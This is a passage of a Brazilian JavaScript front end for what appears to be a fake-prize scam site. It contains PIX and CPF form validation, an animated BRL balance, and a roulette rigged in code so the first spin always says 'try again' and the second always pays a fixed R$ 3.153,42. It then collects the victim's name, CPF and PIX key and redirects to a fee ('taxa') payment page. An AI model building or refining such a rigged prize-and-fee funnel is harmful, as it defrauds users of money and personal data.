      const selector = document.getElementById("pix-type-selector");
      if (selector) {
        // Remove classes para reiniciar animaÃ§Ã£o se jÃ¡ estiver rodando
        selector.classList.remove("shake-animation", "input-error");

        // ForÃ§a reflow
        void selector.offsetWidth;

        // Adiciona classes de erro e animaÃ§Ã£o
        selector.classList.add("input-error", "shake-animation");

        // Remove a animaÃ§Ã£o depois que terminar
        setTimeout(() => {
          selector.classList.remove("shake-animation");
        }, 500);
      }
    }
  });

  // 3. ValidaÃ§Ã£o e Envio (BotÃ£o Enviar no #five)
  document.body.addEventListener("click", function (ev) {
    const btnEnviar = ev.target.closest("#btn-enviar-pix");
    if (!btnEnviar) return;

    ev.preventDefault();

    // Se o botÃ£o estiver desabilitado, executa validaÃ§Ã£o visual (shake)
    if (btnEnviar.classList.contains("btn-disabled")) {
      const nomeInput = document.getElementById("nome");
      const selector = document.getElementById("pix-type-selector");
      const selectorText = document.getElementById("pix-selector-text");
      const keyInput = document.getElementById("pix-key-input");

      // 1. Valida Nome
      if (nomeInput && nomeInput.value.trim() === "") {
        nomeInput.classList.remove("shake-animation", "input-error");
        void nomeInput.offsetWidth; // force reflow
        nomeInput.classList.add("input-error", "shake-animation");
        setTimeout(() => nomeInput.classList.remove("shake-animation"), 500);
      }

      // 2. Valida Seletor de Tipo
      const isTypeSelected =
        selectorText &&
        selectorText.textContent.trim() !== "Escolha o tipo de chave PIX";
      if (!isTypeSelected && selector) {
        selector.classList.remove("shake-animation", "input-error");
        void selector.offsetWidth;
        selector.classList.add("input-error", "shake-animation");
        setTimeout(() => selector.classList.remove("shake-animation"), 500);
      }

      // 3. Valida Chave PIX (se jÃ¡ selecionou tipo)
      if (isTypeSelected && keyInput) {
        const keyValue = keyInput.value.trim();
        let isKeyValid = false;

        // Reutiliza lÃ³gica de validaÃ§Ã£o
        const selectedType = selectorText.textContent.trim();
        switch (selectedType) {
          case "CPF":
            isKeyValid = validateCPF(keyValue);
            break;
          case "E-mail":
            isKeyValid = validateEmail(keyValue);
            break;
          case "Celular":
            isKeyValid = validatePhone(keyValue);
            break;
          case "Chave AleatÃ³ria":
            isKeyValid = validateRandomKey(keyValue);
            break;
          default:
            isKeyValid = keyValue.length > 0;
        }

        if (!isKeyValid) {
          keyInput.classList.remove("shake-animation", "input-error");
          void keyInput.offsetWidth;
          keyInput.classList.add("input-error", "shake-animation");
          keyInput.focus();
          setTimeout(() => keyInput.classList.remove("shake-animation"), 500);
        }
      }

      return; // Impede envio
    }

    // Se passou (botÃ£o habilitado), prossegue
    const nomeInput = document.getElementById("nome");
    const selectorText = document.getElementById("pix-selector-text");
    const keyInput = document.getElementById("pix-key-input");

    // Captura os dados do formulÃ¡rio
    const formData = {
      nome: nomeInput ? nomeInput.value.trim() : "",
      tipoChave: selectorText ? selectorText.textContent.trim() : "",
      chavePix: keyInput ? keyInput.value.trim() : "",
    };

    // Armazena os dados para usar na pÃ¡gina de confirmaÃ§Ã£o
    window.__formData = formData;

    // Salva tambÃ©m no localStorage para persistÃªncia
    try {
      localStorage.setItem("userPixData", JSON.stringify(formData));
    } catch (e) {
      console.error("Erro ao salvar no localStorage", e);
    }

    // Sucesso: Fecha modais e vai para #seven
    closeAllModals();

    if (typeof window.showScreen === "function") {
      window.showScreen("seven");
    } else {
      location.hash = "#seven";
    }
  });

  // Helpers de FormataÃ§Ã£o (MÃ¡scaras)
  function formatPixKey(value, type) {
    if (!value) return "";

    if (type === "CPF") {
      value = value.replace(/\D/g, ""); // Remove tudo que nÃ£o Ã© dÃ­gito
      if (value.length > 11) value = value.slice(0, 11); // Limita a 11 dÃ­gitos

      // Aplica mÃ¡scara: 000.000.000-00
      return value
        .replace(/(\d{3})(\d)/, "$1.$2")
        .replace(/(\d{3})(\d)/, "$1.$2")
        .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
    }

    if (type === "Celular") {
      value = value.replace(/\D/g, ""); // Remove tudo que nÃ£o Ã© dÃ­gito
      if (value.length > 11) value = value.slice(0, 11); // Limita a 11 dÃ­gitos

      // Aplica mÃ¡scara: (00) 00000-0000
      if (value.length > 10) {
        return value.replace(/^(\d\d)(\d{5})(\d{4}).*/, "($1) $2-$3");
      } else if (value.length > 6) {
        return value.replace(/^(\d\d)(\d{4})(\d{0,4}).*/, "($1) $2-$3");
      } else if (value.length > 2) {
        return value.replace(/^(\d\d)(\d{0,5})/, "($1) $2");
      } else {
        return value.replace(/^(\d*)/, "($1");
      }
    }

    if (type === "Chave AleatÃ³ria") {
      // Remove tudo que nÃ£o Ã© hex
      value = value.replace(/[^0-9a-fA-F]/g, "");
      if (value.length > 32) value = value.slice(0, 32); // Limita a 32 chars hex

      // Aplica mÃ¡scara UUID: 8-4-4-4-12
      // xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
      let result = "";
      if (value.length > 0) result += value.slice(0, 8);
      if (value.length > 8) result += "-" + value.slice(8, 12);
      if (value.length > 12) result += "-" + value.slice(12, 16);
      if (value.length > 16) result += "-" + value.slice(16, 20);
      if (value.length > 20) result += "-" + value.slice(20, 32);

      return result;
    }

    return value;
  }

  // 4. RestriÃ§Ã£o de caracteres e MÃ¡scaras no input
  const pixKeyInput = document.getElementById("pix-key-input");
  if (pixKeyInput) {
    pixKeyInput.addEventListener("input", function (ev) {
      const selectorText = document.getElementById("pix-selector-text");
      if (!selectorText) return;

      const selectedType = selectorText.textContent.trim();

      // Aplica formataÃ§Ã£o
      const formattedValue = formatPixKey(this.value, selectedType);

      // Atualiza o valor apenas se mudou (evita loop ou problemas de cursor em alguns casos simples)
      if (this.value !== formattedValue) {
        this.value = formattedValue;
      }

      // Revalida o formulÃ¡rio
      checkPixFormValidity();
    });
  }
})();

/* =========================
   Anima valor e controla active dos botÃµes em #three
   Cole este bloco dentro do seu main.js, idealmente dentro de DOMContentLoaded
   ========================= */

(function () {
  // --- helper: formata nÃºmero como moeda BRL ---
  function formatBRL(value) {
    return new Intl.NumberFormat("pt-BR", {
      style: "currency",
      currency: "BRL",
    }).format(value);
  }

  // --- helper: converte "R$ 4.596,72" -> number (4596.72) ---
  function parseBRL(text) {
    if (!text) return 0;
    // remove tudo exceto dÃ­gitos e vÃ­rgula/ponto
    // suporta formatos: "R$ 4.596,72" ou "4596.72"
    const cleaned = String(text)
      .replace(/\s/g, "")
      .replace(/[Rr]\$\s?/, "")
      .replace(/\./g, "") // remove separador de milhar
      .replace(/,/g, "."); // troca vÃ­rgula decimal para ponto
    const n = parseFloat(cleaned);
    return isNaN(n) ? 0 : n;
  }

  // --- anima nÃºmero de 0 atÃ© target (ou de start -> target) ---
  function animateNumberTo(el, targetNumber, duration = 1400, startNumber = 0) {
    if (!el) return;
    const start = performance.now();
    const end = start + duration;
    function tick(now) {
      const t = Math.min(1, (now - start) / duration);
      // easeOutQuad
      const eased = 1 - (1 - t) * (1 - t);
      const current = startNumber + (targetNumber - startNumber) * eased;
      el.textContent = formatBRL(current);
      if (now < end) {
        requestAnimationFrame(tick);
      } else {
        // garante valor final exato
        el.textContent = formatBRL(targetNumber);
      }
    }
    requestAnimationFrame(tick);
  }

  // --- encontra o elemento do valor na section three ---
  function findAmountElement() {
    // tenta vÃ¡rios seletores comuns (ajuste se quiser)
    const selectors = [
      "#three .valor", // se existir
      "#three .popup-valor",
      "#three .amount",
      "#three .big-valor",
      "#three .valor-principal",
      "#three .saldo-valor",
      "#three .valor-total",
      "#three [data-amount-target]", // data attribute
      "#three .amount-target",
      "#three h1 .valor",
    ];
    for (const sel of selectors) {
      const el = document.querySelector(sel);
      if (el) return el;
    }
    // fallback: busca qualquer texto de moeda dentro de #three
    const three = document.getElementById("three");
    if (!three) return null;
    // procura por nÃ³s que contenham "R$"
    const nodes = three.querySelectorAll("*");
    for (const n of nodes) {
      if (n.children.length === 0 && /R\$\s*\d/.test(n.textContent || "")) {
        return n;
      }
    }
    return null;
  }

  // --- gerencia botÃµes da linha .botoes-row-sacar ---

  function initBotoesRowSacar() {
    const container =
      document.querySelector("#three .botoes-row-sacar") ||
      document.querySelector(".botoes-row-sacar");
    if (!container) return;

    const buttons = Array.from(
      container.querySelectorAll('button, [role="button"], a')
    );

    // incluir manualmente o botÃ£o display-total
    const displayTotal = document.querySelector(".display-total");
    if (displayTotal) buttons.push(displayTotal);

    const activeClass = "btn-active";
    const sacarBtn = document.querySelector(".btn-sacar-dois");

    // comeÃ§a bloqueado
    // quando o botÃ£o sacar estiver ativo e for clicado
    if (sacarBtn) {
      sacarBtn.addEventListener("click", () => {
        // sÃ³ abre se estiver liberado
        if (!sacarBtn.classList.contains("btn-sacar-indisponivel")) {
          if (typeof window.__spa_modal_helpers.showModal === "function") {
            window.__spa_modal_helpers.showModal("four");
          } else {
            showModal("four"); // fallback caso esteja no escopo
          }
        }
      });
    }

    function removeActive() {
      buttons.forEach((btn) => btn.classList.remove(activeClass));
    }

    // === LISTENER CORRETO (somente 1 vez) ===
    buttons.forEach((btn) => {
      btn.addEventListener("click", () => {
        removeActive();
        btn.classList.add(activeClass);

        // liberar o botÃ£o SACAR imediatamente
        if (sacarBtn) {
          sacarBtn.classList.remove("btn-sacar-indisponivel");
          sacarBtn.removeAttribute("disabled");
          sacarBtn.style.pointerEvents = "auto";
          sacarBtn.style.opacity = "1";
        }
      });
    });

    // limpa o estado inicial
    removeActive();
  }

  // --- funÃ§Ã£o principal a ser chamada quando #three for exibida ---
  function onShowThree() {
    // 1) animar valor - DESABILITADO: agora usamos animateCurrencyCounter unificada
    // A animaÃ§Ã£o Ã© feita diretamente no showScreen do router principal
    /*
    const amountEl = findAmountElement();
    if (amountEl) {
      // tenta ler target em data-target (ex: data-amount-target="4596.72")
      let target = null;
      if (amountEl.dataset && amountEl.dataset.amountTarget) {
        target = parseFloat(amountEl.dataset.amountTarget);
      }
      if (target === null || isNaN(target)) {
        target = parseBRL(amountEl.textContent || amountEl.innerText);
      }
      // se nÃ£o encontrou, ignore
      if (!isNaN(target) && target > 0) {
        // opcional: comeÃ§ar mostrando 0 formatado imediatamente
        amountEl.textContent = formatBRL(0);
        animateNumberTo(amountEl, target, 1400, 0);
      }
    }
    */

    // 2) init botoes
    initBotoesRowSacar();
  }

  // --- Hook: se seu router expÃµe showScreen, intercepta chamadas para 'three' ---
  // Se showScreen for global (como no main.js que usamos), monkey-patch para rodar onShowThree sempre que #three for mostrado.
  if (window.showScreen && typeof window.showScreen === "function") {
    const originalShowScreen = window.showScreen;
    window.showScreen = function (id, push) {
      originalShowScreen(id, push);
      if (String(id) === "three") {
        // pequeno timeout para dar tempo ao DOM ser mostrado/estilos aplicados
        setTimeout(onShowThree, 30);
      }
    };
  } else {
    // fallback: quando DOMContentLoaded e se jÃ¡ estiver em #three, executa
    document.addEventListener("DOMContentLoaded", () => {
      if (location.hash.replace("#", "") === "three") {
        setTimeout(onShowThree, 30);
      }
    });
  }

  // tambÃ©m expÃµe manualmente para caso queira disparar por console:
  window.__spa_helpers = window.__spa_helpers || {};
  window.__spa_helpers.onShowThree = onShowThree;
})();

// DESABILITADO: Agora usamos a funÃ§Ã£o unificada animateCurrencyCounter
// que Ã© chamada diretamente no showScreen do router principal
/*
// === Count-up robusto para #three (usa data-amount-target) ===
(function () {
  // evita mÃºltiplas execuÃ§Ãµes
  let threeAnimated = false;

  function formatBRL(value) {
    return value.toLocaleString("pt-BR", {
      style: "currency",
      currency: "BRL",
    });
  }

  function animateCountUp(el, target, duration = 1400) {
    if (!el) return;
    const start = performance.now();
    const from = 0;
    function step(now) {
      const t = Math.min(1, (now - start) / duration);
      const eased = 1 - (1 - t) * (1 - t); // easeOutQuad
      const current = from + (target - from) * eased;
      el.textContent = formatBRL(current);
      if (t < 1) requestAnimationFrame(step);
      else el.textContent = formatBRL(target);
    }
    requestAnimationFrame(step);
  }

  function startCountUpThree() {
    // se jÃ¡ animou e vocÃª nÃ£o quer repetir, pare aqui
    if (threeAnimated) return;
    const el = document.querySelector("#three [data-amount-target]");
    if (!el) return;
    const raw = el.getAttribute("data-amount-target");
    const target = parseFloat(raw);
    if (isNaN(target)) return;
    // mostra zero imediatamente e anima
    el.textContent = formatBRL(0);
    // pequeno timeout para garantir estilos aplicados / repaint
    setTimeout(() => animateCountUp(el, target, 1400), 30);
    threeAnimated = true;
  }

  // 1) Hook no showScreen (se existir)
  if (window.showScreen && typeof window.showScreen === "function") {
    const orig = window.showScreen;
    window.showScreen = function (id, push) {
      orig(id, push);
      if (String(id) === "three") {
        // reseta flag se quiser re-animar cada vez -> threeAnimated = false;
        startCountUpThree();
      }
    };
  }

  // 2) MutationObserver no prÃ³prio #three para detectar classes (fallback)
  const threeEl = document.getElementById("three");
  if (threeEl) {
    const mo = new MutationObserver((records) => {
      for (const r of records) {
        if (r.type === "attributes" && r.attributeName === "class") {
          if (threeEl.classList.contains("is-active")) {
            startCountUpThree();
            break;
          }
        }
      }
    });
    mo.observe(threeEl, { attributes: true, attributeOldValue: true });
  }

  // 3) Caso jÃ¡ esteja ativa no carregamento (ex.: #three no hash), dispara agora
  document.addEventListener("DOMContentLoaded", () => {
    const threeNow = document.getElementById("three");
    if (threeNow && threeNow.classList.contains("is-active")) {
      // aguarda um tick para garantir render
      setTimeout(startCountUpThree, 20);
    }
  });

  // opcional: expor funÃ§Ã£o para forÃ§ar re-execuÃ§Ã£o via console
  window.__countup_helpers = window.__countup_helpers || {};
  window.__countup_helpers.startCountUpThree = function (force) {
    if (force) threeAnimated = false;
    startCountUpThree();
  };
})();
*/

// apaga akiiiiiiiiiiiiiiiii

/* ===== Count-up definitivo para o span em #three ===== */
(function () {
  const SEL = "#three .valor-currency-dois[data-amount-target]";

  function formatBRL(value) {
    return value.toLocaleString("pt-BR", {
      style: "currency",
      currency: "BRL",
    });
  }

  function animateCountUpEl(el, target, duration = 1400) {
    if (!el) return;
    const startVal = 0;
    const startTime = performance.now();
    function step(now) {
      const t = Math.min(1, (now - startTime) / duration);
      const eased = 1 - (1 - t) * (1 - t); // easeOutQuad
      const current = startVal + (target - startVal) * eased;
      el.textContent = formatBRL(current);
      if (t < 1) requestAnimationFrame(step);
      else el.textContent = formatBRL(target); // garante valor final exato
    }
    requestAnimationFrame(step);
  }

  function triggerCountUp() {
    const el = document.querySelector(SEL);
    if (!el) return;
    const raw = el.getAttribute("data-amount-target");
    const target = parseFloat(raw);
    if (isNaN(target)) return;
    // zera e anima
    el.textContent = formatBRL(0);
    // timeout pequeno para garantir repaint antes da animaÃ§Ã£o
    setTimeout(() => animateCountUpEl(el, target, 1400), 20);
  }

  // DESABILITADO: Agora usamos a funÃ§Ã£o unificada animateCurrencyCounter
  // que Ã© chamada diretamente no showScreen do router principal
  /*
  // 1) Hook no showScreen (se existir) â€” re-anima sempre que for para #three
  if (window.showScreen && typeof window.showScreen === "function") {
    const orig = window.showScreen;
    window.showScreen = function (id, push) {
      orig(id, push);
      if (String(id) === "three") {
        // forÃ§a re-animaÃ§Ã£o a cada entrada
        triggerCountUp();
      }
    };
  }

  // 2) MutationObserver no prÃ³prio #three (fallback para outros fluxos)
  const threeEl = document.getElementById("three");
  if (threeEl) {
    const mo = new MutationObserver((records) => {
      for (const r of records) {
        if (r.type === "attributes" && r.attributeName === "class") {
          if (threeEl.classList.contains("is-active")) triggerCountUp();
        }
      }
    });
    mo.observe(threeEl, { attributes: true });
  }
  */

  // 3) Se jÃ¡ estiver ativa no carregamento (ex.: hash = #three), dispara agora
  document.addEventListener("DOMContentLoaded", () => {
    const threeNow = document.getElementById("three");
    if (threeNow && threeNow.classList.contains("is-active")) {
      setTimeout(triggerCountUp, 20);
    }
  });

  // expÃµe helper para testar no console: window.__countup.trigger(true)
  window.__countup = window.__countup || {};
  window.__countup.trigger = function (force) {
    if (force) {
      // forÃ§a zerar e re-rodar
      const el = document.querySelector(SEL);
      if (el) el.textContent = formatBRL(0);
    }
    triggerCountUp();
  };
})();

// apaga abaixo

document.addEventListener("DOMContentLoaded", function () {
  // Garante que o SPA jÃ¡ inicializou o router
  setTimeout(() => {
    if (window.showScreen) {
      const originalShowScreen = window.showScreen;

      window.showScreen = function (id, push) {
        originalShowScreen(id, push);

        if (id === "three") {
          setTimeout(() => {
            if (window.__spa_helpers && window.__spa_helpers.onShowThree) {
              window.__spa_helpers.onShowThree();
            }
          }, 30);
        }
      };
    }
  }, 100);
});

/* =========================================
   ROULETTE & PRIZE FLOW LOGIC
   ========================================= */

document.addEventListener('DOMContentLoaded', () => {
  initRoulette();
  initAddressFlow();
  initPromoFlow();
});

function initPromoFlow() {
  const btnOpenRoulette = document.getElementById('btn-open-roulette');
  if (btnOpenRoulette) {
    btnOpenRoulette.addEventListener('click', () => {
      // Close promo screen
      if (typeof window.closeModal === 'function') {
        window.closeModal('promo-screen');
      } else {
        const promoScreen = document.getElementById('promo-screen');
        if (promoScreen) {
          promoScreen.classList.remove('is-active', 'is-modal');
          promoScreen.setAttribute('aria-hidden', 'true');
        }
      }

      // Open roulette screen as a modal
      if (window.__spa_modal_helpers && typeof window.__spa_modal_helpers.showModal === 'function') {
        window.__spa_modal_helpers.showModal('two');
      } else if (typeof showModal === 'function') {
        showModal('two');
      } else {
        // Fallback if showModal is not available
        if (typeof window.showScreen === 'function') {
          window.showScreen('two');
        } else {
          location.hash = '#two';
        }
      }
    });
  }

  // Intercept initial roulette open if needed
  // If the user lands on #two directly, we might want to redirect to #promo-screen
  // But for now, let's assume the trigger (whatever it is) should be changed to open #promo-screen
  // Since we don't control the external trigger easily, let's check on load
  if (location.hash === '#two') {
    // Redirect to promo
    if (window.__spa_modal_helpers && typeof window.__spa_modal_helpers.showModal === 'function') {
      window.__spa_modal_helpers.showModal('promo-screen');
    } else if (typeof window.showScreen === 'function') {
      window.showScreen('promo-screen');
    } else {
      location.hash = '#promo-screen';
    }
  }
}


// State to track spins
let spinCount = 0;

function initRoulette() {
  const btnStart = document.getElementById('btn-start');
  const roulette = document.getElementById('roulette');

  if (!btnStart || !roulette) return;

  // New Configuration: Multipliers + Try Again
  // Items: 1.2x, 2.2x, 4x, 5x, Tente Novamente
  const data = [
    { color: '#FFDC00', text: '1.2x', type: 'multiplier', name: '1.2x', value: 1.2 },
    { color: '#2ECC40', text: '2.2x', type: 'multiplier', name: '2.2x', value: 2.2 },
    { color: '#F012BE', text: '4x', type: 'multiplier', name: '4x', value: 4 },
    { color: '#FF4136', text: '5x', type: 'multiplier', name: '5x', value: 5 }, // Multiplicador Máximo
    { color: '#AAAAAA', text: 'Tente\nNovamente', type: 'try_again', name: 'Tente Novamente', value: 0 }
  ];

  const itemSize = data.length;
  const angleOffset = -90; // Start at top
  const d = 360 / itemSize;

  // Render Segments
  const wrapW = 300;
  const borderTopWidth = wrapW / 2;
  const borderRightWidth = Math.tan((d * Math.PI) / 360) * borderTopWidth;

  roulette.innerHTML = '';

  data.forEach((item, i) => {
    const rt = i * d + angleOffset + (d / 2);

    const itemEl = document.createElement('div');
    itemEl.className = 'item';
    itemEl.style.left = '50%';
    itemEl.style.top = '50%';
    itemEl.style.marginTop = `-${borderTopWidth}px`;
    itemEl.style.marginLeft = `-${borderRightWidth}px`;
    itemEl.style.borderTopWidth = `${borderTopWidth}px`;
    itemEl.style.borderRightWidth = `${borderRightWidth}px`;
    itemEl.style.borderLeftWidth = `${borderRightWidth}px`;
    itemEl.style.borderTopColor = item.color;
    itemEl.style.borderRightColor = 'transparent';
    itemEl.style.borderLeftColor = 'transparent';
    itemEl.style.transform = `rotate(${rt}deg)`;

    // Label
    const labelEl = document.createElement('div');
    labelEl.className = 'label';
    labelEl.innerHTML = `<span class="text" style="white-space: pre-line;">${item.text}</span>`;
    // Styling
    labelEl.style.position = 'absolute';
    labelEl.style.left = '50%';
    labelEl.style.top = `-${borderTopWidth * 0.75}px`;
    labelEl.style.transform = 'translateX(-50%) rotate(0deg)';
    labelEl.style.textAlign = 'center';
    labelEl.style.width = `${borderRightWidth * 2}px`;
    labelEl.style.color = '#fff';
    labelEl.style.fontWeight = 'bold';
    labelEl.style.fontSize = '14px';
    labelEl.style.textShadow = '1px 1px 2px rgba(0,0,0,0.5)';

    // Adjust text color for lighter backgrounds if needed
    if (item.color === '#FFDC00') {
      labelEl.style.color = '#000';
      labelEl.style.textShadow = 'none';
    }

    itemEl.appendChild(labelEl);
    roulette.appendChild(itemEl);
  });

  // Init Button
  if (btnStart) {
    btnStart.textContent = 'GIRAR';
    btnStart.style.textTransform = 'uppercase';
  }

  btnStart.addEventListener('click', () => {
    if (btnStart.disabled) return;
    btnStart.disabled = true;

    // Determine Result based on spinCount
    let targetName;

    if (spinCount === 0) {
      targetName = 'Tente Novamente';
    } else {
      targetName = '5x';
    }

    let targetIndex = data.findIndex(item => item.name === targetName);
    if (targetIndex === -1) targetIndex = 0; // Fallback

    const selectedPrize = data[targetIndex];

    // Calculate rotation
    // Rotation = 90 - i*d - d/2
    // Add extra spins
    const extraSpins = 5 + Math.floor(Math.random() * 5); // Random 5-10 spins
    const finalRotation = 360 * extraSpins + 90 - (targetIndex * d) - (d / 2);

    // Apply rotation
    roulette.style.transition = 'transform 4s cubic-bezier(0.25, 0.1, 0.25, 1)';
    roulette.style.transform = `rotate(${finalRotation}deg)`;

    // Handle Finish
    setTimeout(() => {
      handleSpinResult(selectedPrize, btnStart);
    }, 4000); // Match transition duration
  });
}

function handleSpinResult(prize, btnStart) {
  if (prize.type === 'try_again') {
    // Show quick alert/toast
    if (typeof window.showToast === 'function') {
      window.showToast('Quase! Tente novamente para multiplicar.', 'error');
    } else {
      alert('Quase! Tente novamente.');
    }

    // Prepare for next spin
    spinCount++;
    btnStart.textContent = 'GIRAR';
    btnStart.disabled = false;

  } else if (prize.type === 'multiplier') {
    // WINNER - 5x
    // const baseValue = 400; 
    // const finalValue = baseValue * prize.value; 
    const finalValue = 3153.42; // Valor solicitado explícito

    // Call showPrizeScreen with formatted values
    const prizeObj = {
      name: `R$ ${finalValue.toFixed(2).replace('.', ',').replace(/\B(?=(\d{3})+(?!\d))/g, ".")}`,
      image: 'images/parabens-img.png', // Or specific prize image
      rawText: `Parabéns! Você recebeu 35.000 moedas que resultam em R$ ${finalValue.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`
    };

    showPrizeScreen(prizeObj);
  }
}

function showPrizeScreen(prize) {
  const prizeScreen = document.getElementById('prize-screen');
  const prizeImage = document.getElementById('prize-image');
  const prizeText = document.getElementById('prize-text');

  if (!prizeScreen) return;

  // Update content
  if (prizeText) {
    // If we passed a specific long text in prize.rawText, use it
    if (prize.rawText) {
      prizeText.textContent = prize.rawText;
    } else {
      prizeText.textContent = `Você ganhou ${prize.name}!`;
    }
  }

  if (prizeImage && prize.image) {
    // Use local image or remote, ensuring path checks if needed
    // Assuming 'images/parabens-img.png' exists locally based on file list
    prizeImage.src = prize.image;
  }

  // Navigate to prize screen
  if (typeof window.showScreen === 'function') {
    window.showScreen('prize-screen');
  } else {
    location.hash = '#prize-screen';
  }

  // Confetti
  if (typeof confetti === 'function') {
    confetti({
      particleCount: 150,
      spread: 70,
      origin: { y: 0.6 }
    });
  }
}


function initAddressFlow() {
  // 1. Claim Button -> Address Screen
  // Tenta pelo ID ou pela classe (fallback)
  const btnClaim = document.getElementById('btn-claim') || document.querySelector('.btn-claim');

  if (btnClaim) {
    btnClaim.addEventListener('click', (ev) => {
      ev.preventDefault();
      // Force redirect to the folder 1 index
      window.location.href = '../saque/index.html';
    });
  }

  // 2. Confirm Address -> Shipping Screen
  const btnConfirmAddress = document.getElementById('btn-confirm-address');
  if (btnConfirmAddress) {
    btnConfirmAddress.addEventListener('click', () => {
      const fullName = document.getElementById('full-name').value;
      const cpf = document.getElementById('cpf').value;
      const pixKey = document.getElementById('pix-key').value;

      if (!fullName || !cpf || cpf.length < 11 || !pixKey) {
        alert('Por favor, preencha todos os dados corretamente.');
        return;
      }

      // Save Data for next step (Taxa / PIX Generation)
      const userData = {
        nome: fullName,
        cpf: cpf,
        email: "não informado", // Email removed from this step
        chavePix: pixKey
      };

      localStorage.setItem('userPixData', JSON.stringify(userData));

      if (typeof window.showScreen === 'function') {
        window.showScreen('shipping-screen');
      } else {
        location.hash = '#shipping-screen';
      }
    });
  }

  // 3. Pay Shipping -> Checkout
  const btnPayShipping = document.getElementById('btn-pay-shipping');
  if (btnPayShipping) {
    btnPayShipping.addEventListener('click', () => {
      // Redirect to local Taxa page
      const checkoutUrl = './taxa/index.html';

      // Inherit UTM params logic (copied from index.html script)
      herdarUTMeRedirecionar(checkoutUrl);
    });
  }
}

// Helper function for UTM inheritance (reused)
function herdarUTMeRedirecionar(urlDestino) {
  const urlAtual = new URL(window.location.href);
  const params = new URLSearchParams(urlAtual.search);
  const parametrosParaHerdar = {};

  for (const [key, value] of params.entries()) {
    if (key.startsWith('utm_') || key === 'ttclid') {
      parametrosParaHerdar[key] = value;
    }
  }

  const urlFinal = new URL(urlDestino, window.location.href);
  const paramsDestino = new URLSearchParams(urlFinal.search);

  for (const [key, value] of Object.entries(parametrosParaHerdar)) {
    paramsDestino.set(key, value);
  }

  urlFinal.search = paramsDestino.toString();
  window.location.href = urlFinal.toString();
}


